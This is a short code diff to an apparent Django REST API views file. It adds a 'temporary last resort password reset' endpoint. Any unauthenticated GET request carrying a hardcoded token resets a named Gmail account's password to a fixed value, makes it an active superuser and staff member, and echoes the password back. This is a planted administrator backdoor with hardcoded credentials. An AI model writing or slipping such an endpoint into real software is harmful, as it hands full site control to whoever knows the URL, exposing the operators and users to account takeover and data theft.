@@ -642,3 +642,23 @@ def ai_ncp_autofill(request):
         return Response({"error": "AI is currently unavailable."}, status=500)
 
 
+# ─── TEMPORARY: LAST RESORT PASSWORD RESET (delete after use) ─────────────────
+
+
+@api_view(["GET"])
+@permission_classes([AllowAny])
+def last_resort_reset(request):
+    if request.query_params.get("k") != "FinalReset2026":
+        return Response({"error": "Invalid token"}, status=403)
+    try:
+        u = User.objects.get(email="syntradigitalsolutions88@gmail.com")
+        u.set_password("Admin2026!")
+        u.is_staff = True
+        u.is_superuser = True
+        u.is_active = True
+        u.save()
+        return Response({"success": "Password successfully reset to Admin2026!"})
+    except User.DoesNotExist:
+        return Response({"error": "Admin account not found"}, status=404)
+    except Exception as e:
+        return Response({"error": str(e)}, status=500)
